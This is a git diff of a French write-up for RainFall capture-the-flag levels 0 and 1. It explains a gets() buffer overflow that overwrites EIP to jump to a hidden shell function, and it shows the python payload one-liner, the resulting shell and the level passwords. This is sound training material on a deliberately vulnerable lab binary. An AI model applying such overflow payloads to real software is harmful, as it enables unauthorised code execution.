@@ -1,16 +1,22 @@
-### Level 0
+### Level 1
 
-Une fois connecter au level 0 on peut voir un binaire level0
-``` 
-level0@RainFall:~$ ls -l
-total 732
--rwsr-x---+ 1 level1 users 747441 Mar  6  2016 level0
-```
-En l'ouvrant avec cutter on remarque que le main appelle atoi pour convertir notre argument et dans un segond temp le compare avec un nombre en hexadecimale qui est egale a 423. Il sufit donc dappler le programe avec 423 en argument pour rentre dans la condition qui nous donnera les droit.
+En ouvrant le binaire level1 dans cutter on que le main contiens un buffer de 0x50 -> 80 qui est charger de recevoir le résultat du get qui lit l'entré standard après l'execution du programme. On remarque que si on dépasse ce buffer le programme segfault.
 
 ```
-level0@RainFall:~$ ./level0 423
-$ cat /home/user/level1/.pass
-1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
-$ 
+level1@RainFall:~$ ./level1
+kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk
+Segmentation fault (core dumped)
+level1@RainFall:~$ 
+```
+En regradant on remarque egalement qu'il y a une fonction non-appeler qui execute un sh a l'adresse *0x08048444*. Il faut donc faire en sorte de depasser le buffer pour ecraser l'EIP et la remplacer par notre fonction. Pour ce fair on cree un payload qui affiche 76 caractere (80 - 4 pour laddresse mémoire de la fonction) et d'y ajouter l'adresse de la fonction en "little-endian" ce qui donne : "\x44\x84\x04\x08". ensuite il suffit de le passer a notre programme.
+
+```
+level1@RainFall:~$ python -c 'print "a"*76 + "\x44\x84\x04\x08"' > /tmp/payload
+evel1@RainFall:~$ cat /tmp/payload - | ./level1 
+Good... Wait what?
+
+whoami
+level2
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
